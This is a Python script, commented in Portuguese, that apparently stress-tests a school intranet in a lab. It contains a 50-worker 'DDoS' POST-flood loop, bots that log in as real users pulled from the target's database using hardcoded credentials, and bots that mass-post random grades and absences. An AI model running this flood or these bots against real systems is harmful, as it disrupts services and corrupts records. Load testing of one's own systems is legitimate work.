import asyncio
import os
import random
import time
import datetime
import aiohttp
import aiomysql

# Configurações do Banco de Dados Alvo (necessário para pegar usuários reais)
DB_HOST = os.getenv('DB_HOST', '10.10.100.4')
DB_PORT = int(os.getenv('DB_PORT', '3306'))
DB_USER = os.getenv('DB_USER', 'intranet_user')
DB_PASS = os.getenv('DB_PASS', 'bcd127')
DB_NAME = os.getenv('DB_NAME', 'intranet_db')

async def get_random_user(pool, role):
    try:
        async with pool.acquire() as conn:
            async with conn.cursor(aiomysql.DictCursor) as cursor:
                if role == 'student':
                    await cursor.execute("SELECT registration as username, 'senha123' as password FROM students WHERE password IS NOT NULL ORDER BY RAND() LIMIT 1")
                else:
                    await cursor.execute("SELECT username, 'senha123' as password, id FROM professors WHERE password IS NOT NULL ORDER BY RAND() LIMIT 1")
                return await cursor.fetchone()
    except Exception as e:
        print(f"Erro DB get_random_user: {e}")
        return None

async def worker_ddos(worker_id, target_url):
    print(f"[DDoS {worker_id}] Iniciado para {target_url}")
    payload = b"X" * 20480 # 20KB de lixo
    # Timeouts muito curtos para não segurar porta e gerar carga no Nginx (SYN/POST flood)
    timeout = aiohttp.ClientTimeout(total=2)
    conn = aiohttp.TCPConnector(limit=0, verify_ssl=False)
    
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        while True:
            try:
                # DDoS não precisa processar a resposta, só mandar lixo no buffer TCP
                await session.post(target_url, data=payload)
            except Exception:
                pass # Ignora erros de timeout, o alvo está sofrendo
            await asyncio.sleep(0.01) # Pequeníssima pausa para não travar o atacante 100% CPU

async def worker_human(worker_id, target_url, bot_type, pool):
    print(f"[Human {worker_id}] Iniciado. Tipo: {bot_type}")
    
    timeout = aiohttp.ClientTimeout(total=10)
    conn = aiohttp.TCPConnector(verify_ssl=False)
    
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        while True:
            try:
                session.headers.update({'User-Agent': f'Bot-Agent-{random.randint(1000,9999)}'})
                
                user = await get_random_user(pool, bot_type)
                if not user:
                    await asyncio.sleep(2)
                    continue

                login_data = {
                    "username": user['username'],
                    "password": user['password'],
                    "login_type": bot_type
                }
                
                # Fazer o login
                async with session.post(f"{target_url}/login", data=login_data, allow_redirects=False) as res:
                    if res.status in [302, 303]: # Redirecionou para o dashboard (Login Ok)
                        # Comportamento
                        if bot_type == 'student':
                            # Flood de visualizações
                            for _ in range(5):
                                async with session.get(f"{target_url}/student_dashboard") as dash_res:
                                    pass
                                await asyncio.sleep(0.5) # Leitura muito rápida (estudante ansioso)
                        
                        elif bot_type == 'professor':
                            # Buscar turma do prof
                            async with pool.acquire() as db_conn:
                                async with db_conn.cursor(aiomysql.DictCursor) as cursor:
                                    await cursor.execute(f"SELECT id FROM classes WHERE professor_id = {user['id']} LIMIT 1")
                                    cls = await cursor.fetchone()
                                    
                                    if cls:
                                        class_id = cls['id']
                                        # Lança várias notas em rajada (Pico de Matrículas/Provas)
                                        await cursor.execute(f"SELECT student_id FROM student_class WHERE class_id = {class_id} ORDER BY RAND() LIMIT 5")
                                        students = await cursor.fetchall()
                                        
                                        for st in students:
                                            grade_data = {"student_id": st['student_id'], "value": str(random.randint(5,10)), "description": "Prova Final"}
                                            async with session.post(f"{target_url}/prof_dashboard/class/{class_id}/grade", data=grade_data):
                                                pass # Ignora a resposta para ser mais rápido
                                            
                                        # Faltas
                                        today = datetime.datetime.now().strftime("%Y-%m-%d")
                                        att_data = {'date': today}
                                        for st in students:
                                            att_data.setdefault('absent_students', []).append(str(st['student_id']))
                                        async with session.post(f"{target_url}/prof_dashboard/class/{class_id}/attendance", data=att_data):
                                            pass
                        
                        # Logout
                        async with session.get(f"{target_url}/logout"):
                            pass
                        
            except Exception as e:
                # Silencia erros comuns sob estresse (ConnectionResetError, Timeout)
                pass
            
            # Pausa minúscula entre ciclos de vida de um bot (Antes era 2-5 segs, agora 0.1 a 0.5)
            await asyncio.sleep(random.uniform(0.1, 0.5))

async def main():
    target_url = os.getenv('TARGET_URL', 'https://10.10.100.4').rstrip('/')
    bot_type = os.getenv('BOT_TYPE', 'student') 

    print(f"[*] Gerenciador de Bot Iniciado. Tipo: {bot_type} | Alvo: {target_url}")

    if bot_type == 'ddos':
        # 1 container de DDoS vai gerar 50 workers assíncronos
        tasks = [asyncio.create_task(worker_ddos(i, target_url)) for i in range(50)]
        await asyncio.gather(*tasks)
    else:
        # Criação de Pool de conexões do DB (usado para pescar usuários reais do alvo)
        try:
            pool = await aiomysql.create_pool(
                host=DB_HOST, port=DB_PORT, user=DB_USER, password=DB_PASS, db=DB_NAME,
                minsize=1, maxsize=20, autocommit=True
            )
            # 1 container de humano (professor/student) vai gerar 10 workers assíncronos rápidos
            tasks = [asyncio.create_task(worker_human(i, target_url, bot_type, pool)) for i in range(10)]
            await asyncio.gather(*tasks)
        except Exception as e:
            print(f"[!] Erro ao conectar no pool DB: {e}")
            await asyncio.sleep(10)

if __name__ == '__main__':
    asyncio.run(main())